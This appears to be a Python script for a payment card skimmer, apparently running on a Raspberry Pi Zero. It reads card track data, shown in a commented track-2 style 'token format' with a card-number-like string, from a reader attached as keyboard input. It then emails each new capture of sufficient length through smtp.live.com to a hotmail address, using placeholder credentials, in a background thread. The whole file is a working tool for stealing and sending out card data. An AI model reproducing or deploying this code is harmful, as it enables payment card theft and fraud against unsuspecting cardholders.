#!/usr/bin/python
from email import message_from_string
from smtplib import SMTP
from threading import Thread
from subprocess import call
from difflib import SequenceMatcher
tmp = '' # To compare one token to another
token = '' # To keep track of tokens
def similar(a, b):
    return SequenceMatcher(None, a, b).ratio()
def semail(tn):
        s = SMTP("smtp.live.com",587)
        s.ehlo() # Hostname to send for this command defaults to the fully qualified domain name of the local host.
        s.starttls() #Puts connection to SMTP server in TLS mode
        s.ehlo()
        s.login('email@hotmail.com', 'password')
        msg = message_from_string(tn)
        msg['From'] = "Zero Pi"
        msg['To'] = "email@hotmail.com"
        msg['Subject'] = "Token"
        s.sendmail("email@hotmail.com", "email@hotmail.com", msg.as_string())
        s.quit()
#;4099900121231234^11111112191110111000? //Token format
while 1:
    found = raw_input('') # Get string
    if (found):
        token = found
        if (len(token) >= 37): # After 37 characters could be a real token with the end sentinel(?)
            checkLast = similar(token[-10:], tmp) #Check to see if we already sent this token by email
            if (checkLast < 0.8): # If we already sent that token, do not send it again
                t1 = Thread(target=semail, args=(token,)) # Create a thread
                t1.start() # Send token in background
                tmp = token[-10:]
        token = '' # Get ready for next track
        if(found == "q"): # Quit with 'q' keystroke
            break
